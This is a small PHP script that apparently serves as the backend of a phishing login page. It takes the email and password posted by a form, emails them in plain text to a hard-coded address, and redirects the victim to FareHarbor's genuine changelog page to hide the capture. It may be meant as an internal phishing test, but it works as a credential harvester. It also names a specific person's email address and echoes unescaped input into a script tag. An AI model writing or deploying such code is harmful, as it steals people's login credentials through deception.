<?php
/*https://github.com/PHPMailer/PHPMailer/blob/master/examples/gmail.phps*/
debug_to_console("php");

// EDIT THE 2 LINES BELOW AS REQUIRED
$email_to = "kevin.billeaud@fareharbor.com";
$email_subject = "New Submission";

$email = $_POST["email"]; // required
$password = $_POST["password"]; // required

/*debug_to_console($email + " " + $password);*/

$email_message = "";
$email_message .= "email: " . $email . "\r\n" ;
$email_message .= "password: " . $password . "\r\n" ;

$headers = 'From: <Teddy@fareharbor.dev>' . "\r\n" .
    'Reply-To: <Teddy@fareharbor.dev>' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

@mail($email_to, $email_subject, $email_message, $headers);

header('Location: https://fareharbor.com/about/changelog/');

?>

<?php
function debug_to_console( $data ) {
    $output = $data;
    if ( is_array( $output ) )
        $output = implode( ',', $output);

    echo "<script>console.log( 'Debug Objects: " . $output . "' );</script>";
}
?>
